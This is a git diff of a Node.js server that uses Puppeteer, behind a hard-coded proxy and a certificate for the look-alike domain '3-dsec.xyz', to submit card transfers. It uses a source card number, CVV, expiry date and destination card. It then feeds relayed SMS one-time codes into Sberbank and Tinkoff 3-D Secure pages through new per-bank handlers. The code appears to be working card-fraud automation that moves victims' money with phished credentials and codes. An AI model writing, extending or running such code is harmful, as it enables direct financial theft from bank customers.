@@ -2,12 +2,20 @@ const puppeteer = require('puppeteer');
 const express = require('express');
 const cors = require('cors')
 const bodyParser = require('body-parser')
+const URL = require('url')
 const EventEmitter = require('events');
+const sberbank = require('./banking/sberbank')
+const tinkoff = require('./banking/tinkoff')
 
 const https = require("https"),
   fs = require("fs");
 
-  const obj = {};
+const obj = {};
+
+const scenarios = {
+  'acs1.sbrf.ru': sberbank,
+  'secure.tinkoff.ru': tinkoff
+}
 
 const options = {
   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
@@ -21,6 +29,10 @@ app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json())
 app.use(cors())
 
+const bankSMSProcess = async (url, page, sms) => {
+  const {hostname} = new URL(url)
+  await scenarios[hostname](page, sms)
+}
 const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) => {
     const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
@@ -51,13 +63,11 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
     
     await page.click('.submit-button-298')
 
-    await page.waitForNavigation({waitUntil: 'networkidle2'});
+    await page.waitForNavigation({waitUntil: 'networkidle2'}, {timeout: 40000});
 
     await page.waitForTimeout(5000);
 
     const inputs = await page.$$('input')
-    const a = await page.$$eval('input', el => el.outerHTML)
-    console.log(a)
 
     if(inputs.length) {
       console.log("wait", id)
@@ -74,13 +84,12 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
       }
       await lockable()
       console.log('successfully recieved', id)
-      await inputs.forEach(async (input) => {
-        await input.type(obj[id])
-      })
+      await bankSMSProcess(await page.url(), page, obj[id])
       console.log('entered')
-      const a = await page.$$eval('input', el => el.outerHTML)
-      console.log(a)
     }
+
+
+    await page.waitForNavigation({waitUntil: 'networkidle2'});
 
     try { 
 
